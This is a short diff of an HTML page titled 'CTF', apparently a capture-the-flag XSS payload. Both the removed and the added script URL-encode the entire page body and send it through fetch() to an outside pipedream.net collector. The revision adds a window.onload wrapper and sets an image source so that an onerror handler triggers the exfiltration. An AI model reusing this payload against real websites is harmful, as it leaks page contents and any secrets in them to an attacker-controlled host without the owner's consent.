@@ -5,9 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title id="flag">CTF</title>
     <script>
-        document.getElementById('flag').onerror = function() {
-            const encodedBody = encodeURIComponent(document.body.innerHTML);
-            fetch(`https://eo8bzrb9y2mj48v.m.pipedream.net?content=${encodedBody}`);
+        window.onload = function() {
+            const imgElement = document.getElementById('flag');
+            imgElement.onerror = function() {
+                const encodedBody = encodeURIComponent(document.body.innerHTML);
+                fetch(`https://eo8bzrb9y2mj48v.m.pipedream.net?content=${encodedBody}`);
+            };
+            imgElement.src = "image.png";
         };
     </script>
 </head>
